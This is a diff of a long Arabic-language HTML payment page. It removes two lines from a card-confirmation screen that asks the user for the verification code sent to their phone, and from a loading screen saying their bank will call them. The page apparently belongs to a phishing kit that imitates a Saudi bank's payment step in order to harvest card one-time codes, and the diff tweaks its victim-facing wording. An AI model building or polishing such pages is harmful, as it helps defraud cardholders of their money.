@@ -29587,7 +29587,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                                                                                                         <div class="pay-by-cards-checkbox" style="margin-top: 0;">
 																														
 																														<div class="pay-by-cards-checkbox-desc ng-star-inserted" style="text-align: center;margin-left: 10px;"> سيتم اجراء معاملة مالية على حسابك المصرفي<br>
-																											لسداد مبلغ قيمته SAR <br>
+																											
 																											باستخدام البطاقة المنتهية برقم <span id="cardLast4"></span><br>
 																											لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.</div>
                                                                                                                           
@@ -30365,7 +30365,7 @@ function form2submit(){
 <ng-lottie _ngcontent-my-app-c259="" class="loading-width">
 <div style="width: 70%; height: 70%;margin: auto 25px;"><img src="../../../new/img/call.gif" width="782" height="587" class="shrinkToFit transparent"></div>
 </ng-lottie>
-<div _ngcontent-my-app-c259="" class="loading-msg f-align-center" style="padding: 0 10px;">لمصادقة عملية الدفع سيتم الاتصال بك من قبل المصرف الخاص بحسابك<br>
+<div _ngcontent-my-app-c259="" class="loading-msg f-align-center" style="padding: 0 10px;">
 بعدها سيتم ارسال رمز التحقق إلى رقم جوالك.
 <span style="color: #fff;background: var(--defaultButtonColor);padding: 10px 0;width: 111%;display: block;margin: 20px -5.5%;font-weight: bold;">يرجي الانتظار!</span></div>
 		</div>
